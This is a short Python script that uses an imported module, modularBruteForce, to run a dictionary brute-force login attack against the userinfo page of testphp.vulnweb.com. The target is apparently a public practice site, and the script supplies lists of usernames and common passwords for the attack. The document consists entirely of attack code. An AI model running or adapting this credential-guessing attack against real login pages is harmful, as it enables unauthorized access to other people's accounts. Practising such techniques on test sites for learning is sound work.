import modularBruteForce
url = "http://testphp.vulnweb.com/userinfo.php"
usernames = ["alice", "bob", "charlie", "dave", "eve", "frank"]
passwords = ["password123", "qwerty", "letmein", "123456", "password1", "admin"]
modularBruteForce.dictMaker(usernames,passwords,url)